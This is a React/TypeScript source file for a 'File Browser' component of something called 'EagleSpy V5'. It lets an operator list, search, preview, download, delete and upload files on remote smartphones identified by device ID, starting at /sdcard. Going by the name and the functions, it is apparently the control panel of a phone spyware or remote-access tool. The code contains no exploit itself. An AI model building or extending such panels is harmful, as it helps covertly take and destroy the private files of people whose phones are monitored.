// File Browser Component for EagleSpy V5
import React, { useState, useEffect, useCallback } from 'react';
import { FaFolder, FaFile, FaDownload, FaTrash, FaEdit, FaSearch, FaUpload, FaEye } from 'react-icons/fa';

function getCsrfToken(): string {
  return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
}

interface FileEntry {
  name: string;
  path: string;
  is_directory: boolean;
  size: number;
  size_readable: string;
  last_modified: number;
  readable: boolean;
  writable: boolean;
  extension: string;
}

interface FileBrowserProps {
  deviceId: string;
  onError?: (error: string) => void;
}

const FileBrowser: React.FC<FileBrowserProps> = ({ deviceId, onError }) => {
  const [currentPath, setCurrentPath] = useState('/sdcard');
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<FileEntry | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [showUploadModal, setShowUploadModal] = useState(false);
  const [showPreviewModal, setShowPreviewModal] = useState(false);
  const [previewContent, setPreviewContent] = useState<any>(null);

  const loadFiles = useCallback(async (path: string) => {
    setLoading(true);
    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files?path=${encodeURIComponent(path)}`
      );
      
      if (!response.ok) {
        throw new Error('Failed to load files');
      }

      const data = await response.json();
      
      // Subscribe to ActionCable for real-time updates
      subscribeToFileBrowser(data.request_id, (responseData: any) => {
        if (responseData.action === 'list_files' && responseData.path === path) {
          setFiles(responseData.entries || []);
          setLoading(false);
        }
      });
    } catch (error) {
      console.error('Error loading files:', error);
      onError?.('Failed to load files');
      setLoading(false);
    }
  }, [deviceId, onError]);

  useEffect(() => {
    loadFiles(currentPath);
  }, [currentPath, loadFiles]);

  const subscribeToFileBrowser = (requestId: string, callback: (data: any) => void) => {
    // Implementation depends on your ActionCable setup
    const cable = (window as any).App?.cable;
    if (cable) {
      const subscription = cable.subscriptions.create(
        { channel: 'FileBrowserChannel', device_id: deviceId },
        { received: callback }
      );
      return () => subscription.unsubscribe();
    }
  };

  const handleNavigate = (path: string) => {
    setCurrentPath(path);
    setSelectedFile(null);
  };

  const handleDownload = async (file: FileEntry) => {
    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files/download?path=${encodeURIComponent(file.path)}`
      );
      
      if (!response.ok) {
        throw new Error('Download failed');
      }

      const data = await response.json();
      
      // Wait for device response
      subscribeToFileBrowser(data.request_id, (responseData: any) => {
        if (responseData.action === 'download_complete') {
          // Trigger browser download
          const content = atob(responseData.content_base64);
          const blob = new Blob([content]);
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = file.name;
          a.click();
          window.URL.revokeObjectURL(url);
        }
      });
    } catch (error) {
      console.error('Error downloading file:', error);
      onError?.('Failed to download file');
    }
  };

  const handleDelete = async (file: FileEntry) => {
    if (!confirm(`Delete ${file.name}?`)) return;

    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files?path=${encodeURIComponent(file.path)}`,
        { method: 'DELETE', headers: { 'X-CSRF-Token': getCsrfToken() } }
      );
      
      if (!response.ok) {
        throw new Error('Delete failed');
      }

      // Reload current directory
      loadFiles(currentPath);
    } catch (error) {
      console.error('Error deleting file:', error);
      onError?.('Failed to delete file');
    }
  };

  const handlePreview = async (file: FileEntry) => {
    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files/preview?path=${encodeURIComponent(file.path)}`
      );
      
      if (!response.ok) {
        throw new Error('Preview failed');
      }

      const data = await response.json();
      
      subscribeToFileBrowser(data.request_id, (responseData: any) => {
        if (responseData.action === 'preview_ready') {
          setPreviewContent(responseData);
          setShowPreviewModal(true);
        }
      });
    } catch (error) {
      console.error('Error previewing file:', error);
      onError?.('Failed to preview file');
    }
  };

  const handleUpload = async (file: File) => {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('destination_path', currentPath);

    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files/upload`,
        {
          method: 'POST',
          headers: { 'X-CSRF-Token': getCsrfToken() },
          body: formData
        }
      );
      
      if (!response.ok) {
        throw new Error('Upload failed');
      }

      // Reload current directory
      loadFiles(currentPath);
      setShowUploadModal(false);
    } catch (error) {
      console.error('Error uploading file:', error);
      onError?.('Failed to upload file');
    }
  };

  const handleSearch = async () => {
    if (!searchQuery.trim()) {
      loadFiles(currentPath);
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files/search?query=${encodeURIComponent(searchQuery)}&path=${encodeURIComponent(currentPath)}`
      );
      
      if (!response.ok) {
        throw new Error('Search failed');
      }

      const data = await response.json();
      
      subscribeToFileBrowser(data.request_id, (responseData: any) => {
        if (responseData.action === 'search_results') {
          setFiles(responseData.results || []);
          setLoading(false);
        }
      });
    } catch (error) {
      console.error('Error searching files:', error);
      onError?.('Failed to search files');
      setLoading(false);
    }
  };

  const renderBreadcrumbs = () => {
    const parts = currentPath.split('/').filter(Boolean);
    return (
      <div className="breadcrumbs flex items-center gap-2 p-4 bg-gray-100 dark:bg-gray-800">
        <button
          onClick={() => handleNavigate('/')}
          className="text-blue-600 hover:underline"
        >
          Root
        </button>
        {parts.map((part, index) => {
          const path = '/' + parts.slice(0, index + 1).join('/');
          return (
            <React.Fragment key={path}>
              <span>/</span>
              <button
                onClick={() => handleNavigate(path)}
                className="text-blue-600 hover:underline"
              >
                {part}
              </button>
            </React.Fragment>
          );
        })}
      </div>
    );
  };

  const renderFileIcon = (file: FileEntry) => {
    if (file.is_directory) {
      return <FaFolder className="text-yellow-500" />;
    }
    return <FaFile className="text-gray-600" />;
  };

  const renderFileList = () => {
    if (loading) {
      return (
        <div className="flex justify-center items-center p-8">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      );
    }

    if (files.length === 0) {
      return (
        <div className="text-center p-8 text-gray-500">
          No files found
        </div>
      );
    }

    return (
      <div className="file-list">
        {files.map((file) => (
          <div
            key={file.path}
            className={`file-item flex items-center justify-between p-3 border-b hover:bg-gray-50 dark:hover:bg-gray-800 cursor-pointer ${
              selectedFile?.path === file.path ? 'bg-blue-50 dark:bg-blue-900' : ''
            }`}
            onClick={() => {
              if (file.is_directory) {
                handleNavigate(file.path);
              } else {
                setSelectedFile(file);
              }
            }}
          >
            <div className="flex items-center gap-3 flex-1">
              {renderFileIcon(file)}
              <div>
                <div className="font-medium">{file.name}</div>
                <div className="text-sm text-gray-500">
                  {!file.is_directory && file.size_readable} · {new Date(file.last_modified).toLocaleDateString()}
                </div>
              </div>
            </div>
            
            {!file.is_directory && (
              <div className="flex gap-2">
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handlePreview(file);
                  }}
                  className="p-2 text-blue-600 hover:bg-blue-100 rounded"
                  title="Preview"
                >
                  <FaEye />
                </button>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handleDownload(file);
                  }}
                  className="p-2 text-green-600 hover:bg-green-100 rounded"
                  title="Download"
                >
                  <FaDownload />
                </button>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handleDelete(file);
                  }}
                  className="p-2 text-red-600 hover:bg-red-100 rounded"
                  title="Delete"
                >
                  <FaTrash />
                </button>
              </div>
            )}
          </div>
        ))}
      </div>
    );
  };

  return (
    <div className="file-browser bg-white dark:bg-gray-900 rounded-lg shadow-lg">
      {/* Header */}
      <div className="header p-4 border-b">
        <div className="flex items-center gap-4">
          <div className="flex-1 flex gap-2">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              onKeyPress={(e) => e.key === 'Enter' && handleSearch()}
              placeholder="Search files..."
              className="flex-1 px-4 py-2 border rounded"
            />
            <button
              onClick={handleSearch}
              className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
            >
              <FaSearch />
            </button>
          </div>
          <button
            onClick={() => setShowUploadModal(true)}
            className="px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700 flex items-center gap-2"
          >
            <FaUpload /> Upload
          </button>
        </div>
      </div>

      {/* Breadcrumbs */}
      {renderBreadcrumbs()}

      {/* File List */}
      <div className="file-list-container max-h-[600px] overflow-y-auto">
        {renderFileList()}
      </div>

      {/* Upload Modal */}
      {showUploadModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
            <h3 className="text-xl font-bold mb-4">Upload File</h3>
            <input
              type="file"
              onChange={(e) => {
                const file = e.target.files?.[0];
                if (file) handleUpload(file);
              }}
              className="w-full p-2 border rounded mb-4"
            />
            <div className="flex justify-end gap-2">
              <button
                onClick={() => setShowUploadModal(false)}
                className="px-4 py-2 bg-gray-300 rounded hover:bg-gray-400"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Preview Modal */}
      {showPreviewModal && previewContent && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-xl max-w-3xl w-full max-h-[80vh] overflow-y-auto">
            <h3 className="text-xl font-bold mb-4">{previewContent.filename}</h3>
            
            {previewContent.content_type.startsWith('text/') && (
              <pre className="bg-gray-100 dark:bg-gray-900 p-4 rounded overflow-x-auto">
                {previewContent.content}
              </pre>
            )}
            
            {previewContent.content_type.startsWith('image/') && (
              <img
                src={`data:${previewContent.content_type};base64,${previewContent.content}`}
                alt={previewContent.filename}
                className="max-w-full"
              />
            )}
            
            <div className="flex justify-end gap-2 mt-4">
              <button
                onClick={() => setShowPreviewModal(false)}
                className="px-4 py-2 bg-gray-300 rounded hover:bg-gray-400"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default FileBrowser;
